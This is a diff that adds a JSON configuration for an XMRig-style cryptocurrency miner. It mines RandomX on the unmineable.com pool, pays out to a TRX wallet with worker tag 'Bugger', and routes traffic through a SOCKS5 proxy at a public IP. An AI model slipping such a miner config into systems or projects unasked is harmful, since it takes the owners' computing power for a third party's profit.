@@ -1,0 +1,25 @@
+{
+    "autosave": true,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": false,
+        "hw-aes": null,
+        "priority": 5,
+    },
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "coin": null,
+            "algo": "rx/0",
+            "url": "rx.unmineable.com:3333",
+            "user": "TRX:TLWasr7Ew35NZ8LY4qnJXiGHifTGszjD3V.Bugger",
+            "pass": "x",
+            "socks5": "socks5://184.181.217.204:4145",
+            "tls": false,
+            "keepalive": true,
+            "nicehash": false
+        }
+    ]
+}
